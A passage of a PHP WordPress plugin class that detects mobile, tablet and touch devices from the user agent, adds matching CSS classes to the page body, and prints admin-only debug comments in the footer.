            _deprecated_function('is_samsung_galaxy_tab', '1.2', 'is_samsung_tablet');
            return is_samsung_tablet();
        }

        /***************************************************************
        * Function is_samsung_tablet
        * Detect the Galaxy tab
        ***************************************************************/
        public function is_samsung_tablet() {
            return($this->detect->is('SamsungTablet'));
        }

        /***************************************************************
        * Function is_kindle
        * Detect an Amazon kindle
        ***************************************************************/
        public function is_kindle() {
            return($this->detect->is('Kindle'));
        }

        /***************************************************************
        * Function is_sony_ericsson
        * Detect a Sony Ericsson
        ***************************************************************/
        public function is_sony_ericsson() {
            return($this->detect->is('Sony'));
        }

        /***************************************************************
        * Function is_nintendo
        * Detect a Nintendo DS or DSi
        ***************************************************************/
        public function is_nintendo() {
            return(preg_match('/Nintendo DSi/i', $this->useragent) || preg_match('/Nintendo DS/i', $this->useragent));
        }


        /***************************************************************
        * Function is_smartphone
        * Grade of phone A = Smartphone - currently testing this
        ***************************************************************/
        public function is_smartphone() {
            $grade = $this->detect->mobileGrade();
            if ($grade == 'A' || $grade == 'B') {
                return true;
            } else {
                return false;
            }
        }

        /***************************************************************
        * Function is_handheld
        * Wrapper function for detecting ANY handheld device
        ***************************************************************/
        public function is_handheld() {
            return( $this->is_mobile() || $this->is_iphone() || $this->is_ipad() || $this->is_ipod() || $this->is_android() || $this->is_blackberry() || $this->is_opera_mobile() || $this->is_webos() || $this->is_symbian() || $this->is_windows_mobile() || $this->is_motorola() || $this->is_samsung() || $this->is_samsung_tablet() || $this->is_sony_ericsson() || $this->is_nintendo());
        }

        /***************************************************************
        * Function is_mobile
        * For detecting ANY mobile phone device
        ***************************************************************/
        public function is_mobile() {
            if ( $this->is_tablet() ) return false;
            return ($this->detect->isMobile());
        }

        /***************************************************************
        * Function is_ios
        * For detecting ANY iOS/Apple device
        ***************************************************************/
        public function is_ios() {
            return($this->detect->isiOS());
        }

        /***************************************************************
        * Function is_tablet
        * For detecting tablet devices (needs work)
        ***************************************************************/
        public function is_tablet() {
            return($this->detect->isTablet());
        }

        /***************************************************************
        * Function is_desktop
        * For detecting desktop devices (needs work)
        ***************************************************************/
        public function is_desktop() {
            return( !$this->detect->is_handheld() );
        }


        /***************************************************************
        * Function is_touch
        * Wrapper function for detecting ANY touchscreen device
        ***************************************************************/
        public function is_touch() {
            if ( defined( Q_RESPONSIVE_FORCE_TOUCH ) && Q_RESPONSIVE_FORCE_TOUCH === true ) { return true; }
            return( $this->is_mobile() || $this->is_iphone() || $this->is_ipad() || $this->is_ipod() || $this->is_android() || $this->is_blackberry() || $this->is_opera_mobile() || $this->is_webos() || $this->is_symbian() || $this->is_windows_mobile() || $this->is_motorola() || $this->is_samsung() || $this->is_samsung_tablet() || $this->is_sony_ericsson() || $this->is_nintendo() || $this->is_tablet() || $this->is_ios() );
        }
        
        
        /**
         * Add browser classes to html body tag
         * 
         * @since 0.1
         */
        public function body_classes( $classes ) {
            
            // grab the post object ##
            global $post;
            
             // add post type
            if ( $post && is_object($post) ) $classes[] = 'posttype-'.$post->post_type; // posttype-type ##
            
            // grab list of browsers ##
            $browser = $this->browsers();
            
            // add browser, version and OS body tags ##
            $classes[] = 'browsers-'.$browser['type']; // client ##
            $classes[] = 'browsers-'.$browser['type'].'-'.$browser['version']; // client-version ##
            $classes[] = 'browsers-'.$browser['agent'].'-'.$browser['type']; // OS-client ##
            
            // add mobile / tablet classes ##
            global $is_lynx, $is_gecko;
            #global $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome;

            // top level
            if ( $this->is_handheld() ) { $classes[] = "browsers-handheld"; };
            if ( $this->is_mobile() ) { $classes[] = "browsers-mobile"; };
            if ( $this->is_ios() ) { $classes[] = "browsers-ios"; };
            if ( $this->is_tablet() ) { $classes[] = "browsers-tablet"; };

            // specific 
            if ( $this->is_iphone() ) { $classes[] = "browsers-iphone"; };
            if ( $this->is_ipad() ) { $classes[] = "browsers-ipad"; };
            if ( $this->is_ipod() ) { $classes[] = "browsers-ipod"; };
            if ( $this->is_android() ) { $classes[] = "browsers-android"; };
            if ( $this->is_blackberry() ) { $classes[] = "browsers-blackberry"; };
            if ( $this->is_opera_mobile() ) { $classes[] = "browsers-opera-mobile";}
            if ( $this->is_webos() ) { $classes[] = "browsers-webos";}
            if ( $this->is_symbian() ) { $classes[] = "browsers-symbian";}
            if ( $this->is_windows_mobile() ) { $classes[] = "browsers-windows-mobile"; }
            //if (is_lg()) { $classes[] = "lg"; }
            if ( $this->is_motorola()) { $classes[] = "browsers-motorola"; }
            //if (is_smartphone()) { $classes[] = "smartphone"; }
            //if (is_nokia()) { $classes[] = "nokia"; }
            if ( $this->is_samsung()) { $classes[] = "browsers-samsung"; }
            if ( $this->is_samsung_tablet()) { $classes[] = "browsers-samsung-tablet"; }
            if ( $this->is_sony_ericsson()) { $classes[] = "browsers-sony-ericsson"; }
            if ( $this->is_nintendo()) { $classes[] = "browsers-nintendo"; }

            // bonus
            if ( !$this->is_handheld()) { $classes[] = "browsers-desktop"; }

            if ($is_lynx) { $classes[] = "browsers-lynx"; }
            if ($is_gecko) { $classes[] = "browsers-gecko"; }
            #if ($is_opera) { $classes[] = "opera"; }
            #if ($is_NS4) { $classes[] = "ns4"; }
            #if ($is_safari) { $classes[] = "safari"; }
            #if ($is_chrome) { $classes[] = "chrome"; }
            #if ($is_IE) { $classes[] = "ie"; }

            // remove duplicates ##
            $classes = array_unique($classes); 
            
            return $classes; // return classes ##

        }
        
        
        /*
         * Add some useful comments in the footer for the admin to check
         * 
         * @since 0.1
         */
        public function comments() {
            
            // is the user logged in ? ##
            if ( is_user_logged_in() && current_user_can( 'manage_options' ) ) { // admins only ##
            
                if ( is_array ( $this->comment_log ) && $this->comment_log[0] ) { // comments found ##

                    echo PHP_EOL."<!-- "; _e('Browsers Comments', 'q-browsers'); echo ": -->".PHP_EOL;

                    foreach ( $this->comment_log as $comment ) {

                        echo "<!-- {$comment} -->".PHP_EOL;

                    }

                }

            }

        }
        
        
    }
    
}
